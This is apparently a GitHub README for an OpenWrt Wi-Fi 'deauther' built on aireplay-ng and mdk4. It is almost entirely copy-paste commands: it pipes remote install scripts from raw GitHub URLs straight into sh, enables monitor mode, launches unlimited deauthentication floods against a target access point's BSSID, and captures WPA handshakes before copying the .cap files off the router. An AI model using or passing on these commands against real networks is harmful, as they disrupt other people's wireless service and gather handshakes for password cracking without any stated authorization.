# openwrt deauther based on airplay-ng and mdk4
- Functions similar on kali
- Can also capture WPA Handshakes
- Stable on openwrt version 22.03.*

## Root access 
```sh
ssh root@192.168.1.1
```
```sh
telnet 192.168.1.1
```
# Mipsel_24kc only 
> Any Openwrt running in this RoC is supported by [mdk4](https://downloads.openwrt.org/releases/23.05.5/targets/ramips/)
 - mt7620
 - mt7621
 - mt76x8
 - rt288x
 - rt305x
 - rt3883
 - 
```sh
opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
```

# Auto install 
```sh
opkg update && wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
````

# Using aireplay-ng 
```sh
sh wlan0mon.sh && airodump-ng wlan0mon
```
> ctrl + c
```sh
aireplay-ng wlan0mon --deauth 0 -a (Mac BSSID)
```
# Monitor Mode 
```sh
wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/wlan0mon.sh | sh
```
# Run
```sh
sh wlan0mon.sh
```
# Using mdk4
```sh
sh wlan0mon.sh && mdk4 wlan0mon d
```
## Manual
> More info
 - aireplay-ng --help
 - airodump-ng --help
 - aircrack-ng --help

`iw phy phy0 interface add wlan0mon type monitor`

`ip link set wlan0mon up`

`airodump-ng wlan0mon`

`aireplay-ng wlan0mon --deauth 0 -a 32:AA:E4:18:90:45 --ignore-negative-one`

- -a | bssid -a (32:AA:E4:18:90:45)

## Export handshake or files from openwrt to local storage
> [!Tip]
> install SFTP server in both system in order that SCP to work

> Openwrt: `opkg install openssh-sftp-server`

> Linux/Termux: `apt install openssh-sftp-server`

- Termux Terminal 
```sh
scp root@192.168.1.1:*.cap storage/downloads
```
- Kali terminal 
```sh
scp root@192.168.1.1:*.cap /home/*/Downloads
```

> [Hint!]
 - * .cap - export any name with .cap file format
